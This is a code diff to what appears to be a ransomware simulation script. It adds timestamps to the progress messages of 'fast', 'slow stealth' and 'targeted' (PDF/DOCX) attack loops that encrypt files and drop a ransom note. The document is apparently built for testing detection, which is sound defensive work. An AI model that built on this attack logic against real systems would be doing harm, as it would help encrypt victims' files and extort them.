@@ -103,8 +103,9 @@ def fast_attack():
 
     for i, f in enumerate(files, 1):
         _encrypt_file(f)
+        t = datetime.now().strftime('%H:%M:%S.%f')[:-3]
         if i <= 5 or i % 10 == 0:
-            print(f"[FAST] {i}/{len(files)} encrypted — {f.name}")
+            print(f"[FAST] {i}/{len(files)} encrypted — {f.name} at {t}")
         time.sleep(0.05)
 
     print(f"[ATTACK] ✓ Fast attack complete — {len(files)} files encrypted")
@@ -120,7 +121,8 @@ def slow_attack():
     print(f"\n[ATTACK] SLOW stealth — encrypting {len(files)} files (2s delay)")
     for i, f in enumerate(files, 1):
         _encrypt_file(f)
-        print(f"[SLOW] {i}/{len(files)} encrypted — {f.name}")
+        t = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        print(f"[SLOW] {i}/{len(files)} encrypted — {f.name} at {t}")
         time.sleep(2)
 
     _drop_ransom_note()
@@ -137,7 +139,8 @@ def targeted_attack():
     print(f"\n[ATTACK] TARGETED — encrypting {len(files)} PDF/DOCX files (0.1s delay)")
     for i, f in enumerate(files, 1):
         _encrypt_file(f)
-        print(f"[TARGETED] {i}/{len(files)} encrypted — {f.name}")
+        t = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        print(f"[TARGETED] {i}/{len(files)} encrypted — {f.name} at {t}")
         time.sleep(0.1)
 
     _drop_ransom_note()
